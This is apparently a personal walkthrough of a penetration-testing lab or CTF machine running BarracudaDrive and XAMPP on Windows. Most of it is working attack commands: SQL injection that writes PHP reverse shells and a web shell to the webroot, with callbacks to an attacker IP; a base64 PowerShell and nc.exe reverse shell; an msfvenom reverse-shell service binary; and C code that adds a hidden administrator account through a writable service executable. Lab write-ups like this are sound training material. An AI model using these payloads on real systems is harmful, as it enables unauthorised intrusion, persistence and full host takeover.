nmap shows ports 135 rpc, 139 netbios, 445 smb, 3306 mysql, 8000 web
when we visit web, it looks like the server is not setup. It asks us to create an admin account, and we do, with admin:adminadmin -- admin@example.com
and get the version of BarracudaDrive
searchsploit shows barracuda drive 6.5 has some insecure file permissions vuln, but it is for privesc

deep nmap scan reveals ports 5040, 30021 ftp anon, 33033, 44330 and more, but I assumed it was msrpc
HINT TAKEN : the other ports, that I thought were msrpc, one of them was web. 45332

the webpage on 45332 is some simple q-a stuff. so we dir search it

`feroxbuster -u http://192.168.110.127:45332 -t 64 -v -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,json,docx,html`

we find phpinfo.php, where we see the webroot, i.x DocumentRoot is 
`c:\Xampp\htdocs`
we also see a user, jerrn

On http://192.168.110.127:33033/ , there's a list of users, and their profile pics, and a quote, along with they emails.
There's one user with a cat profile pic. So we try to login as the cat
Jerren Valon - Only the paranoid survive jerren.devops@company.com
we do "forget password", username - jerren.devops secret-paranoid, and it gets reset
On the profile, edit
Then "request profile", this takes us to /slug
There's a message, mssql 0xw234 something, and there's a url tab
we just put `'` in the tab, and it takes us to a proper mssql error page
`'or 1=1-- //` -- doesnt give any error
since we know the webroot, we can use INTO OUTFILE feature or mysql to write a php-1-liner

`'UNION SELECT '<?php $sock=fsockopen("192.168.45.156",445);exec("cmd.exe <&3 >&3 2>&3"); ?>' INTO OUTFILE 'C:/Xampp/htdocs/rev.php';-- //`
OR, just interchanged '  & "
`'UNION SELECT "<?php $sock=fsockopen('192.168.45.156',445);exec('cmd.exe <&3 >&3 2>&3');?>" INTO OUTFILE "C:/Xampp/htdocs/raj.php";-- //`
^dint give stable enough shell

`'UNION SELECT "<?php $sock=fsockopen('192.168.45.156',445);$proc=proc_open('cmd.exe', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>" INTO OUTFILE "C:/Xampp/htdocs/rad.php";-- //`

Now, head to :45332/rev.php
we get a shell, but it immideately dies
So we upload the simple one-liner
`' UNION SELECT "<?php echo passthru($_GET['cmd']);?>" INTO OUTFILE "C:/xampp/htdocs/cmd.php"-- //`
and then verify rce. next, powersehll 10liner, iconv, b64 encoded
`cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t UTF-16LE | base64 -w0`

`/cmd.php?cmd=powershell+-enc+<the thing from above>`
This doesnt work, so we just send over a nc.exe binary and run it
jerren!

---
privesc is the barracuda drive software that is installed
both c:\bd and c:\bd\bd.exe have F permissions for authenticated users, which we are
The POC said, we can just replace the .exe, do a `shutdown -r`, and the malicious bd.exe should take effect
We went with
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.156 LPORT=445  -f exe-service -o bd.exe`
and it worked. -f exe also works
NT!

---
The code we could also use, as the POC said, was
```c
#include <stdlib.h>

int main ()
{
  int i;
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  WinExec("C:\\bd\\bd.service.exe",0);
  return 0;
}
```

`x86_64-w64-mingw32-gcc adduser.c -o bd.exe`